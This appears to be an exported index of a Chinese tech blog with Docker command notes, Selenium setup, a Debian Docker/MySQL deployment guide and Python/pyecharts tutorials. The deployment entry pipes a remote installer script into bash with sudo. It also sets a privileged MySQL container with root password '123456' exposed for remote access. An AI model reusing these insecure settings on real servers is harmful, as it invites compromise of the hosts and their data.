#重启一个或多个容器#docker stop与docker kill的区别：都可以终止运行中的docker容器。类似于linux中的kill和kill -9这两个命令，docker stop与kill相似，docker kill与kill -9类似docker kill 容器名    #杀掉一个或多个运行中的容器docker rename 容器名 新容器名  #更换容器名#删除容器docker rm 容器名/容器ID            #删除容器  docker rm -f CONTAINER           #强制删除docker rm -f 容器名 容器名 容器名   #删除多个容器 空格隔开要删除的容器名或容器IDdocker rm -f $(docker ps -aq)    #删除全部容器docker inspect 容器名         #获取容器更多信息 docker ps -l                 #最后一次运行的容器docker port 容器名/容器ID     #查看端口的映射情况docker logs 容器名           #查看容器运行日志         docker logs -f 容器名        #持续跟踪日志docker logs -f --tail=20 容器名  #查看末尾多少行docker diff 容器名        #查看容器的改动#进入容器执行命令，两种方式 docker exec 和 docker attach，推荐docker exec#方式一 docker exec。docker exec -it 容器名/容器ID bash#方式二 docker attach，推荐使用docker execdocker attach 容器名/容器ID#从容器退到自己服务器中（不能用ctrl+C）exit      #直接退出。未添加-d(持久化运行容器)时，执行此参数 容器会被关闭ctrl+p+q  #优雅退出。无论是否添加-d参数，执行此命令容器都不会被关闭</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python的selenium库配置</title>
      <link href="/2024/11/18/%E5%BC%80%E5%8F%91/python%E7%9A%84selenium%E5%BA%93%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/11/18/%E5%BC%80%E5%8F%91/python%E7%9A%84selenium%E5%BA%93%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、selenium版本环境"><a href="#一、selenium版本环境" class="headerlink" title="一、selenium版本环境"></a>一、selenium版本环境</h1><p>seleium版本：<code>3.141.0</code><br>pip安装命令：<code>pip install selenium==3.141.0</code></p><h1 id="二、浏览器驱动下载"><a href="#二、浏览器驱动下载" class="headerlink" title="二、浏览器驱动下载"></a>二、浏览器驱动下载</h1><p>Chrome驱动：<br>Chrome130以后：<a href="https://googlechromelabs.github.io/chrome-for-testing/#stable">链接</a><br>Chrome113-129以后：<a href="https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json">链接</a><br>Chrome114之前：<a href="https://chromedriver.storage.googleapis.com/index.html">链接</a><br>Edge:<br><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/">链接</a></p><p>Firefox:<br><a href="https://github.com/mozilla/geckodriver/releases">链接</a></p><p>Safari:<br><a href="https://webkit.org/blog/6900/webdriver-support-in-safari-10/">链接</a></p><h1 id="三、配置浏览器驱动"><a href="#三、配置浏览器驱动" class="headerlink" title="三、配置浏览器驱动"></a>三、配置浏览器驱动</h1><h2 id="3-1Chrome浏览器"><a href="#3-1Chrome浏览器" class="headerlink" title="3.1Chrome浏览器"></a>3.1Chrome浏览器</h2><pre><code class="python">#导入库import timefrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.chrome.service import Servicefrom selenium.webdriver.chrome.options import Optionsoptions = Options()# 设置 Chrome 驱动路径driver_path=&quot;../call/chromedriver.exe&quot;  # 替换为 chromedriver 的实际路径driver = webdriver.Chrome(executable_path=driver_path, options=options)#配置driver参数(可选)driver.maximize_window()    #窗口最大化driver.delete_all_cookies()  # 清空cookie# 加载 HTMLdriver.get(f&quot;http://www.baidu.com&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> python </tag>
            
            <tag> seleium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>debian利用docker部署安全系统</title>
      <link href="/2024/07/28/linux/debian%E5%88%A9%E7%94%A8docker%E9%83%A8%E7%BD%B2%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/07/28/linux/debian%E5%88%A9%E7%94%A8docker%E9%83%A8%E7%BD%B2%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>环境<br><code>debian12.6</code></p><h2 id="一、安装与配置docker"><a href="#一、安装与配置docker" class="headerlink" title="一、安装与配置docker"></a>一、安装与配置docker</h2><p>1.安装docker<br>国内安装脚本</p><pre><code class="shell">sudo curl -fsSL https://gitee.com/tech-shrimp/docker_installer/releases/download/latest/linux.sh| bash -s docker --mirror Aliyun</code></pre><p>2.配置docker镜像地址<code>sudo vi /etc/docker/daemon.json</code></p><pre><code class="json">&#123;    &quot;registry-mirrors&quot;: [        &quot;https://docker.m.daocloud.io&quot;,        &quot;https://docker.1panel.live&quot;,        &quot;https://hub.rat.dev&quot;    ]&#125;</code></pre><p>重启docker并设置开机自启<br><code>sudo systemctl enable docker</code><br><code>sudo systemctl enable docker</code><br>3.安装docker web面板(portainer)</p><pre><code class="javascript">docker run -d --restart=always --name=&quot;portainer&quot; -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock registry.cn-beijing.aliyuncs.com/deanmr/portainer-ce:zh-cn</code></pre><h2 id="二、安装mysql"><a href="#二、安装mysql" class="headerlink" title="二、安装mysql"></a>二、安装mysql</h2><p>1.拉取镜像<br><code>docker pull mysql</code></p><p>2.运行镜像</p><pre><code class="javascript">docker run --name mysql --restart=always --privileged=true \-v /usr/local/mysql/data:/var/lib/mysql \-v /usr/local/mysql/conf.d:/etc/mysql/conf.d \-v /etc/localtime:/etc/localtime:ro \-e MYSQL_ROOT_PASSWORD=123456 -p 3306:3306 -d mysql:latest</code></pre><p>密码为123456<br>3.配置mysql</p><pre><code class="javascript">cd /usr/local/mysqlllcd confvi my.cnf</code></pre><p>在my.cnf中写入</p><pre><code class="javascript">[client]default-character-set=utf8mb4[mysql]default-character-set=utf8mb4[mysqld]# 设置东八区时区default-time_zone = &#39;+8:00&#39;# 设置密码验证规则，default_authentication_plugin参数已被废弃# 改为authentication_policy#default_authentication_plugin=mysql_native_passwordauthentication_policy=mysql_native_password# 限制导入和导出的数据目录# 为空，不限制导入到处的数据目录；# 指定目录，必须从该目录导入到处，且MySQL不会自动创建该目录；# 为NULL，禁止导入与导出功能#secure_file_priv=/var/lib/mysqlsecure_file_priv=init_connect=&#39;SET collation_connection = utf8mb4_0900_ai_ci&#39;init_connect=&#39;SET NAMES utf8mb4&#39;character-set-server=utf8mb4collation-server=utf8mb4_0900_ai_ciskip-character-set-client-handshakeskip-name-resolve</code></pre><p>4.配置授权远程访问<br><strong>进入容器</strong></p><pre><code class="bash">docker exec -it mysql /bin/bash</code></pre><p><strong>登录mysql</strong></p><pre><code class="javascript">mysql -u root -p</code></pre><p><strong>选择数据库</strong></p><pre><code class="nginx">show databases;use mysql;</code></pre><p> <strong>查看用户连接情况</strong></p><pre><code class="pgsql"> select host, user, plugin,  authentication_string, password_expired from user;</code></pre><p><strong>修改密码认证方式</strong></p><pre><code class="javascript">ALTER USER root@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;123456&#39;;ALTER USER root@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;123456&#39;;-- 刷新权限FLUSH PRIVILEGES;</code></pre><p><strong>退出容器</strong><br><code>exit</code></p><p>5.重启mysql<br>设置docker启动时启动mysql</p><pre><code class="javascript">docker update mysql --restart=always</code></pre><p>重启mysql</p><pre><code class="maxima">docker restart mysql</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> debian </tag>
            
            <tag> 安全系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python安全编程</title>
      <link href="/2024/07/01/%E5%BC%80%E5%8F%91/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"/>
      <url>/2024/07/01/%E5%BC%80%E5%8F%91/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 安全编程 </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决pyechart模块绘制地图无数据</title>
      <link href="/2024/06/18/%E5%BC%80%E5%8F%91/%E8%A7%A3%E5%86%B3pyechart%E6%A8%A1%E5%9D%97%E7%BB%98%E5%88%B6%E5%9C%B0%E5%9B%BE%E6%97%A0%E6%95%B0%E6%8D%AE/"/>
      <url>/2024/06/18/%E5%BC%80%E5%8F%91/%E8%A7%A3%E5%86%B3pyechart%E6%A8%A1%E5%9D%97%E7%BB%98%E5%88%B6%E5%9C%B0%E5%9B%BE%E6%97%A0%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<p>在绘制地图发现没有数据<br><img src="https://picture.tanglx.cn/web/2024/1718695755122.png" alt="enter description here"><br><strong>错误原因:</strong><br>传入数据中的省份名称不规范<br>例如：</p><pre><code class="python">data = [    (&quot;北京&quot;, 99),    (&quot;上海&quot;, 199),    (&quot;湖南&quot;, 299),    (&quot;台湾&quot;, 399),    (&quot;广东&quot;, 499)]</code></pre><p><strong>解决办法：</strong><br>使用此函数，把传入地图的数据传入函数进行处理(返回规范后的数据)<br>函数使用语法:<code>data=norm_province(data)</code></p><blockquote><p>data为存放地图的数据，传入nrom_province变量中返回处理后的数据</p></blockquote><pre><code class="python">def norm_province(data):    &quot;&quot;&quot;    :param data: 传入pyecharts地图模块中的data数据    :return: 返回校正后的data数据    &quot;&quot;&quot;    province = (&quot;新疆维吾尔自治区&quot;, &quot;西藏自治区&quot;, &quot;宁夏回族自治区&quot;, &quot;广西壮族自治区&quot;, &quot;内蒙古自治区&quot;, &quot;澳门特别行政区&quot;,                &quot;香港特别行政区&quot;, &quot;重庆市&quot;, &quot;北京市&quot;, &quot;天津市&quot;, &quot;上海市&quot;, &quot;甘肃省&quot;, &quot;青海省&quot;, &quot;四川省&quot;, &quot;云南省&quot;,                &quot;贵州省&quot;, &quot;陕西省&quot;, &quot;湖南省&quot;, &quot;湖北省&quot;, &quot;河南省&quot;, &quot;山西省&quot;, &quot;河北省&quot;, &quot;辽宁省&quot;, &quot;吉林省&quot;, &quot;黑龙江省&quot;,                &quot;山东省&quot;, &quot;江苏省&quot;, &quot;安徽省&quot;, &quot;浙江省&quot;, &quot;江西省&quot;, &quot;福建省&quot;, &quot;台湾省&quot;, &quot;广东省&quot;, &quot;海南省&quot;)    norm_data = []    for x in data:        x=list(x)        for area in province:            if x[0] in area:                x[0]=area                x=tuple(x)                norm_data.append(x)    return norm_data</code></pre><p><strong>成功截图:</strong><br><img src="https://picture.tanglx.cn/web/2024/1718696511508.png" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> python </tag>
            
            <tag> 数据可视化 </tag>
            
            <tag> pyechart模块 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据可视化开发</title>
      <link href="/2024/06/14/%E5%BC%80%E5%8F%91/Python%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E5%BC%80%E5%8F%91/"/>
      <url>/2024/06/14/%E5%BC%80%E5%8F%91/Python%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、pyecharts模块"><a href="#一、pyecharts模块" class="headerlink" title="一、pyecharts模块"></a>一、pyecharts模块</h1><p>pyecharts模块可以完成数据可视化效果图<br><a href="https://pyecharts.org/">pyecharts官网</a><br><a href="https://gallery.pyecharts.org/">pyecharts官网画廊</a>，官方示例</p><h1 id="二、构建折线图"><a href="#二、构建折线图" class="headerlink" title="二、构建折线图"></a>二、构建折线图</h1><p>构建折线图以<code>x轴、y轴、名称</code>三个要素为构建基础<br>x轴和y轴的数据以列表的形式存放</p><h2 id="2-1、创建折线图"><a href="#2-1、创建折线图" class="headerlink" title="2.1、创建折线图"></a>2.1、创建折线图</h2><pre><code class="python">#导入包from pyecharts.charts import Line#创建一个折线图对象line = Line()#给折线图对象添加x轴数据line.add_xaxis([&quot;中国&quot;,&quot;美国&quot;,&quot;德国&quot;])#给折线图添加y轴数据line.add_yaxis(&quot;GDP&quot;,[30,20,10])#通过rander方法，将代码生成图像line.render(&quot;名称.html&quot;)#</code></pre><h2 id="2-2、配置项"><a href="#2-2、配置项" class="headerlink" title="2.2、配置项"></a>2.2、配置项</h2><h3 id="2-2-1、全局配置选项"><a href="#2-2-1、全局配置选项" class="headerlink" title="2.2.1、全局配置选项"></a>2.2.1、全局配置选项</h3><pre><code class="python">#导入包from pyecharts.charts import Line#导入配置项from pyecharts.options import TitleOpts,LegendOpts,ToolboxOpts,VisualMapOpts#创建一个折线图对象line = Line()#创建全局配置项line.set_global_opts(    title_opts=TitleOpts(title=&quot;GDP展示&quot;,pos_left=&quot;center&quot;,pos_bottom=&quot;1%&quot;),  #标题展示    legend_opts=LegendOpts(is_show=True),  #图例    toolbox_opts=ToolboxOpts(is_show=True), #工具箱    visualmap_opts=VisualMapOpts(is_show=False) #视觉映射)</code></pre><h3 id="2-2-2、系列配置选项"><a href="#2-2-2、系列配置选项" class="headerlink" title="2.2.2、系列配置选项"></a>2.2.2、系列配置选项</h3><pre><code class="python">#导入包from pyecharts.charts import Linefrom pyecharts.options import LabelOpts#给折线图y轴关闭数据显示line.add_yaxis(&quot;GDP&quot;,[30,20,10],label_opts=LabelOpts(is_show=False))</code></pre><h1 id="三、构建地图"><a href="#三、构建地图" class="headerlink" title="三、构建地图"></a>三、构建地图</h1><h2 id="3-1、创建地图"><a href="#3-1、创建地图" class="headerlink" title="3.1、创建地图"></a>3.1、创建地图</h2><p>构建地图以<code>名称、数据、地图类型</code>三要素为构建要素<br>地图类型默认为<code>&quot;china&quot;</code>(可以不写),也可以写全国各省例如：<code>&quot;云南&quot;</code>(同时导入的data数据也要写为省内各市)<br>map数据以列表嵌套元组的形式存放<code>[(地区1,数值),(地区2,数值)]</code></p><pre><code class="python">#导包from pyecharts.charts import Map# 创建对象map = Map()# 创建数据data = [    (&quot;云南省&quot;,1000),    (&quot;上海市&quot;,900),    (&quot;四川省&quot;,898),    (&quot;广西壮族自治区&quot;,720),    (&quot;广东省&quot;,450),    (&quot;山东省&quot;,700)]#传入数据map.add(&quot;测试&quot;,data,&quot;china&quot;)#数据名称,数据,地图类型(默认为china，也可以写省份)#生成地图map.render(&quot;名称.html&quot;)</code></pre><p>注意事项：</p><ul><li>各个省的命名规则需要规范，否则数据无法显示</li></ul><pre><code class="text">&quot;新疆维吾尔自治区&quot;, &quot;西藏自治区&quot;, &quot;宁夏回族自治区&quot;, &quot;广西壮族自治区&quot;, &quot;内蒙古自治区&quot;, &quot;澳门特别行政区&quot;,&quot;香港特别行政区&quot;, &quot;重庆市&quot;, &quot;北京市&quot;, &quot;天津市&quot;, &quot;上海市&quot;, &quot;甘肃省&quot;, &quot;青海省&quot;, &quot;四川省&quot;, &quot;云南省&quot;,&quot;贵州省&quot;, &quot;陕西省&quot;, &quot;湖南省&quot;, &quot;湖北省&quot;, &quot;河南省&quot;, &quot;山西省&quot;, &quot;河北省&quot;, &quot;辽宁省&quot;, &quot;吉林省&quot;, &quot;黑龙江省&quot;,&quot;山东省&quot;, &quot;江苏省&quot;, &quot;安徽省&quot;, &quot;浙江省&quot;, &quot;江西省&quot;, &quot;福建省&quot;, &quot;台湾省&quot;, &quot;广东省&quot;, &quot;海南省</code></pre><h2 id="3-2、配置项"><a href="#3-2、配置项" class="headerlink" title="3.2、配置项"></a>3.2、配置项</h2><h3 id="3-2-1、全局配置项"><a href="#3-2-1、全局配置项" class="headerlink" title="3.2.1、全局配置项"></a>3.2.1、全局配置项</h3><p>地图颜色<a href="https://tool.oschina.net/commons?type=3">RGB对照表</a><br>地图颜色显示</p><pre><code class="python">#导入options下的VisualMapOpts,TitleOpts包from pyecharts.options import VisualMapOpts,TitleOpts# 设置全局选项-地图颜色map.set_global_opts(    title_opts=TitleOpts(title=&quot;全国疫情地图&quot;),#大标题    visualmap_opts=VisualMapOpts(        is_show=True,#是否显示        is_piecewise=True,#是否分段        pieces=[            &#123;&quot;min&quot;: 1, &quot;max&quot;: 9, &quot;label&quot;: &quot;1-9&quot;, &quot;color&quot;: &quot;#CCFFFF&quot;&#125;,            &#123;&quot;min&quot;: 10, &quot;max&quot;: 99, &quot;label&quot;: &quot;10-99&quot;, &quot;color&quot;: &quot;#FF6666&quot;&#125;,            &#123;&quot;min&quot;: 100, &quot;max&quot;: 500, &quot;label&quot;: &quot;100-500&quot;, &quot;color&quot;: &quot;#990033&quot;&#125;        ]    ))</code></pre><h3 id="3-2-2-系列配置项"><a href="#3-2-2-系列配置项" class="headerlink" title="3.2.2 系列配置项"></a>3.2.2 系列配置项</h3><h1 id="四、构建柱状图"><a href="#四、构建柱状图" class="headerlink" title="四、构建柱状图"></a>四、构建柱状图</h1><h2 id="4-1、创建柱状图"><a href="#4-1、创建柱状图" class="headerlink" title="4.1、创建柱状图"></a>4.1、创建柱状图</h2><pre><code class="python">#构建基本柱状图#导包from pyecharts.charts import Bar#创建一个对象bar = Bar()#添加x轴数据bar.add_xaxis([&quot;中国&quot;,&quot;美国&quot;,&quot;英国&quot;])#添加y轴数据bar.add_yaxis(&quot;GDP&quot;,[30,20,10])#绘图bar.render(&quot;柱状图.html&quot;)</code></pre><h2 id="4-2、配置项"><a href="#4-2、配置项" class="headerlink" title="4.2、配置项"></a>4.2、配置项</h2><h3 id="4-2-1、全局配置项"><a href="#4-2-1、全局配置项" class="headerlink" title="4.2.1、全局配置项"></a>4.2.1、全局配置项</h3><h3 id="4-2-2、系列配置项"><a href="#4-2-2、系列配置项" class="headerlink" title="4.2.2、系列配置项"></a>4.2.2、系列配置项</h3><p>图表反转</p><pre><code class="python">#构建基本柱状图#导包from pyecharts.charts import Bar#创建一个对象bar = Bar()#添加x轴数据bar.add_xaxis([&quot;中国&quot;,&quot;美国&quot;,&quot;英国&quot;])#添加y轴数据bar.add_yaxis(&quot;GDP&quot;,[30,20,10])#反转x和y轴bar.reversal_axis()#绘图bar.render(&quot;柱状图.html&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> python </tag>
            
            <tag> 数据可视化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python常用模块使用</title>
      <link href="/2024/06/07/%E5%BC%80%E5%8F%91/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/06/07/%E5%BC%80%E5%8F%91/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="1、sys-解释器交互"><a href="#1、sys-解释器交互" class="headerlink" title="1、sys(解释器交互)"></a>1、sys(解释器交互)</h3><p><strong>终止程序</strong><br><code>sys.exit()</code></p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
            <tag> python </tag>
            
            <tag> 模块 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础语法-2</title>
      <link href="/2024/06/05/%E5%BC%80%E5%8F%91/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-2/"/>
      <url>/2024/06/05/%E5%BC%80%E5%8F%91/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-2/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="基础语法-2"><a href="#基础语法-2" class="headerlink" title="基础语法-2"></a>基础语法-2</h1><h2 id="一、文件"><a href="#一、文件" class="headerlink" title="一、文件"></a>一、文件</h2><h3 id="1-1、文件的编码"><a href="#1-1、文件的编码" class="headerlink" title="1.1、文件的编码"></a>1.1、文件的编码</h3><p>编码就是一种转换的规则集合，记录了内容和二进制间进行相互转换的逻辑。<br>编码有许多中，最常用的是<code>UTF-8</code>编码</p><p>计算机只识别0和1，需要将内容通过编码转换为0和1才能在计算机中保存，或者0和1需要通过编码转换为内容。</p><pre><code class="sml">内容-&gt;编码-&gt;二进制二进制-&gt;编码-&gt;内容</code></pre><h3 id="1-2、文件的打开和关闭"><a href="#1-2、文件的打开和关闭" class="headerlink" title="1.2、文件的打开和关闭"></a>1.2、文件的打开和关闭</h3><h4 id="1-2-1、打开文件"><a href="#1-2-1、打开文件" class="headerlink" title="1.2.1、打开文件"></a>1.2.1、打开文件</h4><p>语法1：<code>文件对象=open(name,mode,encoding)</code><br>示例1：<code>f=open(&quot;D:/测试.txt&quot;,&quot;r&quot;,encoding=&quot;UTF-8&quot;)</code><br>这种打开方式如果程序没有停止，不会自动释放文件</p><p>语法2：<code>with open(name,mode,encoding) as 文件对象</code><br>通过with open() as 文件对象, 这种方式打开的文件，读取完会自动释放文件</p><blockquote><p>name:是要打开的目标文件名字符串(可以包含文件所在的具体路径)。<br>mode:设置打开文件的模式(访问模式):只读，写入、追加等。<br>encoding:编码格式(推荐使用UTF-8)</p></blockquote><p>mode常用的三种基础访问模式：</p><blockquote><p>r：以只读方式打开文件，文件的指针将会放在文件的开头。这是默认模式<br>w：打开一个文件只用于写入。如果该文件已存在则打开文件，并从头开始编辑，原有内容会被删除；如果该文件不存在，创建新文件。<br>a：打开一个文件用于追加，如果文件已存在，新的内容会被写入到已有内容之后；如果该文件不存在，创建新文件进行写入</p></blockquote><h4 id="1-2-2、关闭文件"><a href="#1-2-2、关闭文件" class="headerlink" title="1.2.2、关闭文件"></a>1.2.2、关闭文件</h4><ul><li>关闭文件对象，也就是关闭对文件的占用</li><li>如果不调用close,同时程序没有停止运行，那么这个文件将一直被Python程序占用</li><li>close()方法里面内置了flush()<br>语法：<code>close()</code><br>示例:</li></ul><pre><code class="python">f=open(&quot;D:/测试.txt&quot;,&quot;r&quot;,encoding=&quot;UTF-8&quot;)f.close()</code></pre><h3 id="1-3、文件的读取"><a href="#1-3、文件的读取" class="headerlink" title="1.3、文件的读取"></a>1.3、文件的读取</h3><p><strong>读取指定长度字节</strong><br>语法：<code>文件对象.read(num)</code><br>注意：不写字节(num)则读取全部内容</p><p><strong>读取一行</strong><br>语法：<code>文件对象.readlin()</code></p><p><strong>读取全部行，得到列表</strong><br>语法：<code>文件对象.readlins()</code><br>注意：读取全部行，得到列表，每一行为一个元素</p><p><strong>for循环文件行</strong><br>语法：<code>for line in 文件对象</code><br>注意：一次循环得到一行数据</p><h3 id="1-4、文件的写入"><a href="#1-4、文件的写入" class="headerlink" title="1.4、文件的写入"></a>1.4、文件的写入</h3><p>语法：<code>文件对象.write(内容)</code><br>示例：</p><pre><code class="python"># 1.打开文件f=open(&quot;python.txt&quot;,&#39;w&#39;,encoding=&quot;UTF-8&quot;)# 2.写入缓冲区f.write(&quot;helloword&quot;)# 3.写入到文件f.flush()</code></pre><p>注意事项：</p><ul><li>直接调用write，内容并未真正写入文件，而是会积累在程序的内存中，称之为缓冲区</li><li>当调用flush的时候，内容会真正写入文件</li><li>这样做是避免频繁的操作硬盘，导致效率下降(攒一堆，一次写入磁盘)</li><li>close()方法内置了flush功能</li></ul><h3 id="1-5、文件的追加"><a href="#1-5、文件的追加" class="headerlink" title="1.5、文件的追加"></a>1.5、文件的追加</h3><p>语法：<code>文件对象.write(内容)</code><br>示例：</p><pre><code class="python"># 1.打开文件f=open(&quot;python.txt&quot;,&#39;a&#39;,encoding=&quot;UTF-8&quot;)# 2.写入缓冲区f.write(&quot;helloword&quot;)# 3.写入到文件f.flush()</code></pre><p>注意事项：</p><ul><li>a模式，文件不存在会创建文件</li><li>a模式，文件存在会在最后，追加写入文件</li></ul><h2 id="二、异常"><a href="#二、异常" class="headerlink" title="二、异常"></a>二、异常</h2><p>当检测到<code>一个错误</code>时，Python解释器就无法继续执行了，反而出现了一些错误提示，这就是所谓的<code>异常</code>，也就是我们常说的<code>BUG</code></p><h3 id="2-1、异常的捕获方法"><a href="#2-1、异常的捕获方法" class="headerlink" title="2.1、异常的捕获方法"></a>2.1、异常的捕获方法</h3><p>捕获异常的作用在于：在可能发生异常的地方，进行捕获，当异常出现的时候，提供解决方法，而不是任由其导致程序无法运行。</p><p>普通语法：</p><pre><code class="python">try:    可能发生错误的代码except:    如果出现异常执行的代码</code></pre><p>指定类型捕获：</p><pre><code class="python">try:    可能发生错误的代码except(异常类型1,异常类型2):    如果出现指定异常执行的代码</code></pre><p>捕获所有异常：</p><pre><code class="python">try:    可能发生错误的代码except Exception as e:#as a 会把异常信息给变量a    不论出现什么异常都执行的代码</code></pre><p>异常else和异常finally：</p><pre><code class="python">try:    可能发生错误的代码except Exception as e:#as a 会把异常信息给变量a    不论出现什么异常都执行的代码else:    没有异常执行的代码finally:    无论是否异常都执行</code></pre><h2 id="三、模块和Python包"><a href="#三、模块和Python包" class="headerlink" title="三、模块和Python包"></a>三、模块和Python包</h2><p>模块是一个<code>python文件</code>，以<code>.py结尾</code>，模块能定义函数，类和变量，模块里也能包含可执行代码</p><p> pycharm快捷键：<code>ctrl加左键</code>点击模块名，就能查看.py文件<br>  pycharm快捷键：<code>ctrl加p键</code>点击模块名，就能查看传入参数的提示</p><h3 id="3-1、模块的导入"><a href="#3-1、模块的导入" class="headerlink" title="3.1、模块的导入"></a>3.1、模块的导入</h3><p>模块在使用前需要先导入<br>导入语法:</p><pre><code class="python">[from 模块名] import [模块 | 类 | 变量 | 函数 | *] [as 别名]</code></pre><p>常见的组合形式如：</p><pre><code class="python">import 模块名from 模块名 import 类、变量、方法等(功能)from 模块名 import *import 模块名 as 别名from 模块名 import 功能名 as 别名</code></pre><ul><li>import 引入模块所有功能,用<code>模块.功能</code>调用</li><li>from 模块 import 功能 单独获取一个功能,直接使用<code>功能</code></li><li>from可以省略，直接import即可</li><li>as别名可以省略</li><li>通过”.”来确定层级关系</li><li>模块的导入一般写在代码文件的开头</li></ul><h3 id="3-2、自定义模块并导入"><a href="#3-2、自定义模块并导入" class="headerlink" title="3.2、自定义模块并导入"></a>3.2、自定义模块并导入</h3><p>定义一个.py文件作为模块，函数作为内容<br>示例：</p><pre><code class="python"># 新建一个Python文件，命名未my_modulel.py 并定义test函数# my_modulel.pydef test(a,b)    print(a+b)# 调用自定义模块# test_my_module.pyimport my_module.pymy_module.test(10,20)</code></pre><p><strong>自定义模块中的测试(main)：</strong><br>当自定义一个模块的时候，模块里面可能需要写一些除了函数以外的测试代码，<code>测试模块</code>就是为了避免调用模块时执行这些测试代码</p><p>语法:</p><pre><code class="python"># my_modulel.py(自定义模块)def test(a,b)    print(a+b)if __name__ == &#39;__main__&#39;: #(在pycharm中只需要输入main，就会自动补全)    测试语句</code></pre><p><strong>自定义模块中的限制导入(all)</strong><br>自定义模块中如果有多个函数，improt*会把这些函数全导入过去，<code>__all__</code>就是为了做限制导入的函数<br>语法:</p><pre><code class="python"># my_modulel.py(自定义模块)__all__ = [&#39;test&#39;]#限制只能improt*只能导入test函数def test(a,b)    print(a+b)    def test_b(a,b)    print(a+b)</code></pre><h2 id="注意事项-不同模块，同名的功能，如果都被导入，那么后导入的会覆盖先导入的"><a href="#注意事项-不同模块，同名的功能，如果都被导入，那么后导入的会覆盖先导入的" class="headerlink" title="注意事项:- 不同模块，同名的功能，如果都被导入，那么后导入的会覆盖先导入的"></a><strong>注意事项:</strong><br>- 不同模块，同名的功能，如果都被导入，那么后导入的会覆盖先导入的</h2><h3 id="3-3、自定义Python包"><a href="#3-3、自定义Python包" class="headerlink" title="3.3、自定义Python包"></a>3.3、自定义Python包</h3><p>模块是一个.py文件，<code>python包</code>其实就是一个<code>文件夹</code>,在该文件夹下包含了一个<code>__init__.py</code> 文件，该文件夹可用于包含多个<code>模块文件</code>，从逻辑上看，包的本质依然是<code>模块</code></p><h4 id="3-3-1、定义Python包"><a href="#3-3-1、定义Python包" class="headerlink" title="3.3.1、定义Python包"></a>3.3.1、定义Python包</h4><ul><li>1.创建一个文件夹，文件夹内包含一个<code>__init__.py</code> 文件，那么这文件夹就是包(pycharm可以右键创建包)</li><li>2.在这个文件夹中，写入模块</li></ul><h4 id="3-3-2、导入Python包"><a href="#3-3-2、导入Python包" class="headerlink" title="3.3.2、导入Python包"></a>3.3.2、导入Python包</h4><p>语法1:<code>from 包名 import 模块名</code><br>语法2:<code>import 包名.模块名</code></p><h3 id="3-4、安装第三方包"><a href="#3-4、安装第三方包" class="headerlink" title="3.4、安装第三方包"></a>3.4、安装第三方包</h3><p>在python程序生态中，有许多非常多的第三方包(非Python官方)，可以极大帮助我们提高开发效率，如：</p><ul><li>科学计算中常用的: numpy包</li><li>数据分析中常用的：pandas包</li><li>大数据计算中常用的：pyspark、apache-flink包</li><li>图像可视化常用的：matplotlib、pyecharts包</li><li>人工智能常用的：tensorflow包</li><li>等</li></ul><p><strong>安装第三方包-pip</strong></p><ul><li>使用Python内置pip在命令提示符中输入，语法:<code>pip install 包名称</code></li><li>使用国内网络下载：<code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple 包名称</code></li><li>pycharm中安装</li></ul><h2 id="四、json数据格式"><a href="#四、json数据格式" class="headerlink" 